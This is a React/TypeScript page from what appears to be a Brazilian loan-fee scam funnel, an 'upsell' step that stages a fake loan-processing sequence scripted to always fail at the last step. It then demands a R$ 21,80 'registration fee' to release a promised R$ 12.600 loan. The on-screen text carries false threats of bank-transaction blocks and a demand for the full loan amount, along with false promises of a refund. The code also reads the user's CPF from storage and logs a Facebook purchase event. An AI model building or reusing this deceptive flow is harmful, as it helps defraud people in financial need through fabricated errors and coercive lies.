import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';
import { CheckCircle2, XCircle, AlertTriangle, Loader2, Clock } from 'lucide-react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import UserMenu from '../components/UserMenu';
import { getUserName } from '../utils/userUtils';
import { navigateWithParams } from '../utils/urlParams';
import { trackPurchase } from '../utils/facebookPixel';

interface LoadingStep {
  id: number;
  label: string;
  status: 'pending' | 'loading' | 'completed' | 'error';
  progress: number;
}

export default function Upsell2Page() {
  const navigate = useNavigate();
  const location = useLocation();
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [showCalculatingModal, setShowCalculatingModal] = useState(false);
  const [showMainContent, setShowMainContent] = useState(false);
  const [calculatingStep, setCalculatingStep] = useState(0);

  const [loadingSteps, setLoadingSteps] = useState<LoadingStep[]>([
    { id: 1, label: 'Analisando Dados…', status: 'pending', progress: 0 },
    { id: 2, label: 'Taxa de verificação…', status: 'pending', progress: 0 },
    { id: 3, label: 'Transferindo empréstimo…', status: 'pending', progress: 0 },
    { id: 4, label: 'Concluindo pagamento...', status: 'pending', progress: 0 }
  ]);

  const calculatingSteps = [
    'Consultando dados…',
    'Calculando taxa…',
    'Gerando boleto/pagamento…'
  ];

  useEffect(() => {
    trackPurchase({
      value: 39.90,
      currency: 'BRL',
      content_type: 'upsell',
      content_name: 'Upsell',
      num_items: 1,
    });

    saveFunnelData({
      currentStep: '/upsell-2'
    });
  }, []);

  useEffect(() => {
    let stepIndex = 0;
    const stepDuration = 2500;

    const processStep = (index: number) => {
      setLoadingSteps(prev => prev.map((step, i) => {
        if (i === index) {
          return { ...step, status: 'loading', progress: 0 };
        }
        return step;
      }));

      const progressInterval = setInterval(() => {
        setLoadingSteps(prev => prev.map((step, i) => {
          if (i === index && step.progress < 100) {
            const newProgress = Math.min(step.progress + 2, index === 3 ? 85 : 100);
            return { ...step, progress: newProgress };
          }
          return step;
        }));
      }, 50);

      setTimeout(() => {
        clearInterval(progressInterval);

        if (index === 3) {
          setLoadingSteps(prev => prev.map((step, i) => {
            if (i === index) {
              return { ...step, status: 'error', progress: 85 };
            }
            return step;
          }));
          setTimeout(() => setShowErrorModal(true), 500);
        } else {
          setLoadingSteps(prev => prev.map((step, i) => {
            if (i === index) {
              return { ...step, status: 'completed', progress: 100 };
            }
            return step;
          }));

          if (index < 3) {
            setTimeout(() => processStep(index + 1), 300);
          }
        }
      }, stepDuration);
    };

    processStep(stepIndex);
  }, []);

  const handleCalculateTax = () => {
    setShowErrorModal(false);
    setShowCalculatingModal(true);
    setCalculatingStep(0);

    const stepDuration = 1200;
    let currentStep = 0;

    const interval = setInterval(() => {
      currentStep++;
      if (currentStep < calculatingSteps.length) {
        setCalculatingStep(currentStep);
      } else {
        clearInterval(interval);
        setTimeout(() => {
          setShowCalculatingModal(false);
          setShowMainContent(true);

          setTimeout(() => {
            const button = document.querySelector('button[class*="bg-green-600"]');
            if (button) {
              button.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
          }, 10000);
        }, 500);
      }
    }, stepDuration);
  };

  const handleRegularizeTaxa = () => {
    const { userData } = location.state || {};
    const cpf = userData?.cpf || sessionStorage.getItem('user_cpf') || localStorage.getItem('user_cpf');
    console.log('Upsell2 - CPF from storage:', cpf);

    if (!cpf) {
      console.error('CPF not found in storage. Redirecting to home.');
      navigate('/');
      return;
    }

    navigateWithParams(
      navigate,
      '/upsell-payment',
      location,
      {
        amount: 21.80,
        title: 'Tarifa de Cadastro',
        redirectPath: '/upsell-3',
        cpf: cpf,
        userData: userData
      }
    );
  };

  const handleMenuClick = () => {
    setIsMenuOpen(!isMenuOpen);
  };

  const handleMenuClose = () => {
    setIsMenuOpen(false);
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <Header showUserIcon={true} onMenuClick={handleMenuClick} />
      <UserMenu isOpen={isMenuOpen} onClose={handleMenuClose} userName={getUserName()} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 md:p-8 pt-24 sm:pt-28 pb-20">
        <div className="w-full max-w-lg">
          {!showMainContent ? (
            <div className="bg-white rounded-3xl shadow-xl p-8 sm:p-10 mb-6 border border-gray-100">
              <div className="text-center mb-8">
                <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-purple-500 to-purple-600 rounded-2xl mb-4 shadow-lg">
                  <span className="text-3xl font-bold text-white">💰</span>
                </div>
                <h2 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-4 leading-tight">
                  Último passo para você<br />receber <span className="text-purple-600">R$ 12.600,00</span>!
                </h2>
                <div className="max-w-md mx-auto">
                  <p className="text-sm text-gray-600 leading-relaxed">
                    Esse é o último passo para você receber seu crédito. Verificamos que esse é o primeiro empréstimo que você solicita conosco.
                  </p>
                  <div className="mt-4 p-4 bg-purple-50 rounded-xl border border-purple-100">
                    <p className="text-sm text-purple-900 font-medium">
                      É necessário efetuar o pagamento da tarifa de cadastro para receber seu crédito imediato.
                    </p>
                  </div>
                </div>
              </div>
              <div className="space-y-5">
                {loadingSteps.map((step) => (
                  <div
                    key={step.id}
                    className="transition-all duration-300"
                  >
                    <div className="flex items-center gap-4 mb-2">
                      <div className="flex-shrink-0">
                        {step.status === 'pending' && (
                          <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center">
                            <Clock className="w-5 h-5 text-gray-400" />
                          </div>
                        )}
                        {step.status === 'loading' && (
                          <div className="w-10 h-10 rounded-full bg-purple-100 flex items-center justify-center">
                            <Loader2 className="w-5 h-5 text-purple-600 animate-spin" />
                          </div>
                        )}
                        {step.status === 'completed' && (
                          <div className="w-10 h-10 rounded-full bg-green-100 flex items-center justify-center animate-scale-in">
                            <CheckCircle2 className="w-6 h-6 text-green-600" />
                          </div>
                        )}
                        {step.status === 'error' && (
                          <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center animate-scale-in">
                            <XCircle className="w-6 h-6 text-red-600" />
                          </div>
                        )}
                      </div>
                      <span className={`text-base font-medium transition-colors ${
                        step.status === 'completed' ? 'text-green-600' :
                        step.status === 'loading' ? 'text-purple-600' :
                        step.status === 'error' ? 'text-red-600' :
                        'text-gray-500'
                      }`}>
                        {step.label}
                      </span>
                    </div>
                    {(step.status === 'loading' || step.status === 'error') && (
                      <div className="ml-14 pr-14 bg-gray-100 rounded-full h-2.5 overflow-hidden shadow-inner">
                        <div
                          className={`h-full transition-all duration-300 ${
                            step.status === 'error' ? 'bg-gradient-to-r from-red-500 to-red-600' : 'bg-gradient-to-r from-purple-500 to-purple-600'
                          }`}
                          style={{ width: `${step.progress}%` }}
                        />
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="bg-white rounded-3xl shadow-xl border border-gray-100 overflow-hidden">
                <div className="bg-red-600 text-white p-4 text-center">
                  <p className="text-sm font-semibold">
                    ⚠️ O não pagamento da Tarifa de Cadastro resultará no cancelamento do empréstimo e no bloqueio de futuras transações bancárias.
                  </p>
                </div>

                <div className="p-8 sm:p-10">
                  <div className="space-y-6">
                    <div className="flex items-start gap-4">
                      <div className="w-10 h-10 rounded-full bg-green-100 flex items-center justify-center flex-shrink-0">
                        <CheckCircle2 className="w-6 h-6 text-green-600" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-base font-semibold text-gray-900 mb-1">
                          Taxa de Verificação
                        </h3>
                        <p className="text-sm text-green-600">
                          Pagamento concluído com sucesso
                        </p>
                      </div>
                    </div>

                    <div className="flex items-start gap-4">
                      <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center flex-shrink-0 animate-pulse">
                        <XCircle className="w-6 h-6 text-red-600" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-base font-semibold text-gray-900 mb-1">
                          Pagamento da Tarifa de Cadastro
                        </h3>
                        <p className="text-sm text-red-600 font-medium">
                          Aguardando pagamento para liberação do crédito
                        </p>
                      </div>
                    </div>

                    <div className="flex items-start gap-4">
                      <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center flex-shrink-0">
                        <Clock className="w-5 h-5 text-gray-400" />
                      </div>
                      <div className="flex-1">
                        <h3 className="text-base font-semibold text-gray-900 mb-1">
                          Crédito na conta
                        </h3>
                        <p className="text-sm text-gray-500">
                          Crédito enviado para sua conta bancária
                        </p>
                      </div>
                    </div>
                  </div>

                  <div className="mt-8 p-4 bg-amber-50 rounded-xl border border-amber-200">
                    <p className="text-sm text-amber-900 leading-relaxed">
                      O não pagamento da tarifa resultará no reembolso de todos pagamentos já realizados e no cancelamento do contrato do empréstimo, impossibilitando uma nova contratação por um prazo máximo de 90 dias.
                    </p>
                  </div>
                </div>
              </div>

              <div className="bg-white rounded-3xl shadow-xl p-8 sm:p-10 border border-gray-100">
                <div className="text-center mb-6">
                  <div className="inline-block mb-6">
                    <div className="bg-gradient-to-r from-purple-500 to-purple-600 rounded-2xl px-8 py-5 shadow-xl transform hover:scale-105 transition-transform duration-200">
                      <p className="text-xs font-semibold text-purple-100 uppercase tracking-wider mb-1">
                        Valor da Tarifa
                      </p>
                      <p className="text-4xl font-bold text-white">
                        R$ 21,80
                      </p>
                    </div>
                  </div>
                  <p className="text-sm text-gray-600 mb-6 max-w-md mx-auto">
                    Essa tarifa é obrigatória para validação e liberação do crédito. Após o pagamento, o valor será totalmente reembolsado.
                  </p>

                  <button
                    onClick={handleRegularizeTaxa}
                    className="w-full py-4 px-6 rounded-xl font-semibold text-white bg-green-600 hover:bg-green-700 transition-colors duration-200 shadow-lg hover:shadow-xl mb-4 animate-scale-pulse hover:animate-none"
                    id="payment-button"
                  >
                    PAGAR TARIFA
                  </button>

                  <div className="p-4 bg-red-50 rounded-xl border border-red-200">
                    <p className="text-sm text-red-700 font-medium leading-relaxed">
                      ⚠️ Atenção: Caso o valor de R$ 21,80 não seja quitado, o sistema exigirá o pagamento integral de R$ 12.600,00. O não cumprimento poderá acarretar em bloqueios do empréstimo.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      <Footer />

      {showErrorModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 animate-fade-in">
          <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8 animate-scale-in">
            <div className="text-center">
              <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <AlertTriangle className="w-12 h-12 text-red-600" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">
                Atenção! Confirmação Necessária
              </h3>
              <p className="text-sm text-gray-600 leading-relaxed mb-8">
                Durante a análise final, identificamos uma pendência relacionada à Tarifa de Cadastro, necessária para garantir a segurança do processo e liberar o crédito solicitado.
                <br /><br />
                Esta tarifa é 100% reembolsável após a confirmação do pagamento.
              </p>
              <button
                onClick={handleCalculateTax}
                className="w-full py-4 px-6 rounded-xl font-semibold text-white bg-purple-600 hover:bg-purple-700 transition-colors duration-200 shadow-lg hover:shadow-xl"
              >
                Verificar Agora
              </button>
            </div>
          </div>
        </div>
      )}

      {showCalculatingModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 animate-fade-in">
          <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full p-8 animate-scale-in">
            <div className="text-center">
              <div className="w-20 h-20 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-6">
                <Loader2 className="w-12 h-12 text-purple-600 animate-spin" />
              </div>
              <h3 className="text-xl font-bold text-gray-900 mb-4">
                {calculatingSteps[calculatingStep]}
              </h3>
              <div className="w-full bg-gray-100 rounded-full h-2 overflow-hidden">
                <div className="h-full bg-gradient-to-r from-purple-500 to-purple-600 animate-progress" />
              </div>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes fade-in {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.9);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }
        @keyframes progress {
          0% {
            width: 0%;
          }
          100% {
            width: 100%;
          }
        }
        .animate-fade-in {
          animation: fade-in 0.3s ease-out;
        }
        .animate-scale-in {
          animation: scale-in 0.3s ease-out;
        }
        .animate-progress {
          animation: progress 1s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
}
